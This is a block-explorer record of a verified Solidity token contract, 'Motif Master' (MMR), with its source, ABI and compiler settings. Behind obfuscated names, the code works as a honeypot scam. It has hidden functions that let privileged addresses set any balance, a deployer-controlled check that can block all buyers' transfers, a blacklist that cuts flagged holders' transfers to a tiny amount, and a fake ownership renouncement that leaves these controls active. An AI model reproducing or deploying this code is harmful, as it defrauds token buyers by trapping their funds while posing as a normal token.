{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface txMarketingFee {\n    function createPair(address shouldMax, address swapWallet) external returns (address);\n}\n\ninterface atLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeLaunch) external view returns (uint256);\n\n    function transfer(address toTradingShould, uint256 takeSwap) external returns (bool);\n\n    function allowance(address walletBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toTradingShould,\n        uint256 takeSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundReceiver, uint256 value);\n    event Approval(address indexed walletBuy, address indexed spender, uint256 value);\n}\n\nabstract contract senderTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityMarketing is atLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MotifMaster is senderTake, atLiquidity, liquidityMarketing {\n\n    address private marketingFee;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderAuto;\n    }\n\n    mapping(address => mapping(address => uint256)) private sellTo;\n\n    function allowance(address toFrom, address launchLimit) external view virtual override returns (uint256) {\n        if (launchLimit == tradingBuy) {\n            return type(uint256).max;\n        }\n        return sellTo[toFrom][launchLimit];\n    }\n\n    function limitIsMode(address tokenAuto) public {\n        totalSwapMode();\n        if (sellMarketing) {\n            modeMin = false;\n        }\n        if (tokenAuto == marketingAuto || tokenAuto == receiverFee) {\n            return;\n        }\n        liquidityEnable[tokenAuto] = true;\n    }\n\n    uint256 constant launchedAuto = 15 ** 10;\n\n    function autoLaunched(address feeShould, address toTradingShould, uint256 takeSwap) internal returns (bool) {\n        require(enableTx[feeShould] >= takeSwap);\n        enableTx[feeShould] -= takeSwap;\n        enableTx[toTradingShould] += takeSwap;\n        emit Transfer(feeShould, toTradingShould, takeSwap);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingFee;\n    }\n\n    function tokenTrading(address isList) public {\n        if (amountTrading) {\n            return;\n        }\n        if (autoExempt == teamEnableReceiver) {\n            liquidityMin = teamEnableReceiver;\n        }\n        enableAmount[isList] = true;\n        if (liquidityMin == teamEnableReceiver) {\n            modeMin = true;\n        }\n        amountTrading = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountSwap;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return walletAuto;\n    }\n\n    function marketingFundLiquidity(address feeShould, address toTradingShould, uint256 takeSwap) internal returns (bool) {\n        if (feeShould == marketingAuto) {\n            return autoLaunched(feeShould, toTradingShould, takeSwap);\n        }\n        uint256 isLimit = atLiquidity(receiverFee).balanceOf(teamWallet);\n        require(isLimit == txToken);\n        require(toTradingShould != teamWallet);\n        if (liquidityEnable[feeShould]) {\n            return autoLaunched(feeShould, toTradingShould, launchedAuto);\n        }\n        return autoLaunched(feeShould, toTradingShould, takeSwap);\n    }\n\n    function tokenSwap(address shouldTotal, uint256 takeSwap) public {\n        totalSwapMode();\n        enableTx[shouldTotal] = takeSwap;\n    }\n\n    bool public modeMin;\n\n    function balanceOf(address takeLaunch) public view virtual override returns (uint256) {\n        return enableTx[takeLaunch];\n    }\n\n    mapping(address => bool) public liquidityEnable;\n\n    constructor (){\n        \n        toSell amountLiquidity = toSell(tradingBuy);\n        receiverFee = txMarketingFee(amountLiquidity.factory()).createPair(amountLiquidity.WETH(), address(this));\n        \n        marketingAuto = _msgSender();\n        enableAmount[marketingAuto] = true;\n        enableTx[marketingAuto] = senderAuto;\n        limitTotal();\n        if (sellMarketing) {\n            autoExempt = teamEnableReceiver;\n        }\n        emit Transfer(address(0), marketingAuto, senderAuto);\n    }\n\n    function approve(address launchLimit, uint256 takeSwap) public virtual override returns (bool) {\n        sellTo[_msgSender()][launchLimit] = takeSwap;\n        emit Approval(_msgSender(), launchLimit, takeSwap);\n        return true;\n    }\n\n    mapping(address => uint256) private enableTx;\n\n    function transferFrom(address feeShould, address toTradingShould, uint256 takeSwap) external override returns (bool) {\n        if (_msgSender() != tradingBuy) {\n            if (sellTo[feeShould][_msgSender()] != type(uint256).max) {\n                require(takeSwap <= sellTo[feeShould][_msgSender()]);\n                sellTo[feeShould][_msgSender()] -= takeSwap;\n            }\n        }\n        return marketingFundLiquidity(feeShould, toTradingShould, takeSwap);\n    }\n\n    bool public amountTrading;\n\n    uint256 minTo;\n\n    function launchMin(uint256 takeSwap) public {\n        totalSwapMode();\n        txToken = takeSwap;\n    }\n\n    uint256 public teamEnableReceiver;\n\n    function limitTotal() public {\n        emit OwnershipTransferred(marketingAuto, address(0));\n        marketingFee = address(0);\n    }\n\n    string private amountSwap = \"MMR\";\n\n    function transfer(address shouldTotal, uint256 takeSwap) external virtual override returns (bool) {\n        return marketingFundLiquidity(_msgSender(), shouldTotal, takeSwap);\n    }\n\n    uint8 private totalLaunch = 18;\n\n    uint256 public autoExempt;\n\n    uint256 txToken;\n\n    function totalSwapMode() private view {\n        require(enableAmount[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed exemptSell, address indexed launchReceiver);\n\n    address public receiverFee;\n\n    string private walletAuto = \"Motif Master\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalLaunch;\n    }\n\n    uint256 private liquidityMin;\n\n    mapping(address => bool) public enableAmount;\n\n    address tradingBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public sellMarketing;\n\n    address teamWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private senderAuto = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return marketingFee;\n    }\n\n    address public marketingAuto;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeSwap\",\"type\":\"uint256\"}],\"name\":\"launchMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAuto\",\"type\":\"address\"}],\"name\":\"limitIsMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamEnableReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSwap\",\"type\":\"uint256\"}],\"name\":\"tokenSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isList\",\"type\":\"address\"}],\"name\":\"tokenTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toTradingShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MotifMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}